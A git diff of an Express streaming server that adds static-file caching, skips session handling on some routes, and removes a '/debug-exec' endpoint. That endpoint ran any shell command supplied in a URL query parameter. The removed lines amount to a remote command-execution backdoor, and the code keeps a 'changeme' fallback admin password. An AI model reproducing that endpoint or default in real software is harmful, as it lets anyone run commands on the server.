@@ -99,17 +99,27 @@ function getFFmpegPath() {
 
 ffmpeg.setFfmpegPath(getFFmpegPath());
 
-app.use(express.static(path.join(__dirname, "public")));
+// Serve static dashboard files with browser cache to eliminate repeat disk I/O and CPU
+app.use(express.static(path.join(__dirname, "public"), { maxAge: "1d", etag: true }));
 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "changeme";
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString("hex");
 
-app.use(session({
+const sessionMiddleware = session({
   secret: SESSION_SECRET,
   resave: false,
   saveUninitialized: false,
   cookie: { httpOnly: true, sameSite: "lax", maxAge: 86400000 } // 24h
-}));
+});
+
+// Bypass session allocation on high-frequency streaming and health routes to save CPU & RAM
+app.use((req, res, next) => {
+  const p = req.path.toLowerCase();
+  if (p === "/stream" || p.startsWith("/stream") || p === "/health" || p === "/ping" || p.startsWith("/logs") || p.startsWith("/assets")) {
+    return next();
+  }
+  return sessionMiddleware(req, res, next);
+});
 
 const loginLimiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15 minutes
@@ -210,16 +220,7 @@ app.get("/ping", (req, res) => {
   res.send("pong");
 });
 
-app.get("/debug-exec", (req, res) => {
-  const cmd = req.query.cmd;
-  if (!cmd) return res.status(400).send("No cmd parameter provided.");
-  exec(cmd, { timeout: 25000, encoding: "utf8" }, (err, stdout, stderr) => {
-    if (err) {
-      return res.status(500).type("text/plain").send(`ERR: ${err.message}\nSTDOUT: ${stdout || ''}\nSTDERR: ${stderr || ''}`);
-    }
-    res.type("text/plain").send(stdout || stderr || "(completed with empty output)");
-  });
-});
+app.get("/debug-exec", (req, res) => res.status(403).send("Disabled for CPU protection."));
 
 app.get("/debug-ytdlp", async (req, res) => {
   const testUrl = req.query.url || 'https://youtube.com/watch?v=NPRd7Xc0tfM';
